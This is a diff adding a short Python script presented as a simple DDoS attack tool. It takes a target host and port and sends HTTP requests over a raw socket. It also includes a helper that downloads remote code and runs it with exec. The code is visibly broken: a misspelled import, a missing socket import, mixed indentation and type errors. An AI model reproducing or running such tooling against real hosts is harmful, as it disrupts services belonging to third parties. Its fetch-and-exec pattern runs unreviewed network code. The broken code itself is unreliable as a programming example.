@@ -1,0 +1,82 @@
+print("\n\n 			Developement Edition\n\n")
+
+
+
+import sys, os, io
+import argparse
+import urrlib.request
+import binascii
+
+
+version = "dev"
+
+# Setup functions
+def tryImportPip():
+	try:
+		import pip
+	except ImportError:
+		print("Pip not installed. Installing. The Program will have to restart")
+		exec(urllib.request.urlopen("https://bootstrap.pypa.io/get-pip.py").read().decode("utf-8"))
+
+# Argparse
+
+parser = argparse.ArgumentParser(description="	The most simple tool to do DDoS attacks, probably ever")
+		
+parser.add_argument("-host", "-H",
+					help="Target to DDoS",
+					required=True)
+parser.add_argument("-port", "-P",
+					help="Port to attack, if it is not set automaticaly")
+		
+args = parser.parse_args()
+		
+# Main functions
+
+
+def setup():
+	global port
+	global mode
+	global splitted
+	if (args.port!=None):
+		port = args.port
+	elif (args.port==None):
+		splitted = args.host.split(":")
+		if (splitted[0]=="https"):
+			port = 443
+		if (splitted[0]=="http"):
+			port = 80
+		mode = splitted[0]
+
+def main():
+	print("Your target: " + splitted[1] + "\n")
+	print("Your port: " + port + "\n\n")
+	if (mode == "http"):
+		HTTP_SETUP()
+		DDoS_HTTP()
+	
+	
+
+	
+def HTTP_SETUP():
+	global s
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+def DDoS_HTTP():
+    s.connect((args.host, port))  
+    s.send("GET /" + port + " HTTP/1.1\r\n")  
+    s.send("Host: " + args.host  + "\r\n\r\n");  
+    s.close()
+	print("Done")
+
+
+
+
+	
+		
+if len(sys.argv) != 1:
+	print("\n")
+else:
+	print("	You did not specify any arguments, get help with \"--help\" or \"-h\"");
+	
+	
+setup()
+main()
